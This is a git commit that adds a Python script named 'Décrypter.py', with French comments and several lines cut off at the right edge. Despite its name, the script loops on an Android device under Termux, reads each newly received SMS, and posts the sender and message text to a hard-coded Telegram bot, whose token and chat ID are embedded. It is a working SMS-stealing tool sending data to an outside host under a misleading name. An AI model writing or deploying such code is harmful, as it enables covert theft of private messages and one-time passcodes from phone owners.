5c7a49502a77adbf5f84b36c27a96d43ce8e8458
jordan12251 <dosantosjotham@gmail.com>
2025-10-29 22:33:32 +0200

    Create Décrypter.py

---
+++ Décrypter.py
@@ -0,0 +1,35 @@
+import subprocess
+import requests
+import time
+import json
+
+# 🔑 Ton token et chat_id Telegram
+TELEGRAM_TOKEN = "7767041903:AAEL4enFf0gWivFoZs0f>
+CHAT_ID = "7874160840"
+
+def get_last_sms():
+    try:
+        output = subprocess.check_output(["termux>
+        sms_list = json.loads(output.decode("utf->
+        if sms_list:
+            return sms_list[0]  # dernier SMS
+    except Exception as e:
+        print("Erreur:", e)
+    return None
+
+def send_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM>
+    payload = {"chat_id": CHAT_ID, "text": messag>
+    requests.post(url, data=payload)
+
+last_id = None
+while True:
+    sms = get_last_sms()
+    if sms and sms["received"] != last_id:
+        sender = sms.get("address", "Inconnu")
+        body = sms.get("body", "")
+        msg_id = sms.get("received", "")
+        formatted = f"📩 Nouveau SMS\n\n👤 De: {s>
+        send_telegram(formatted)
+        last_id = msg_id
+    time.sleep(5)
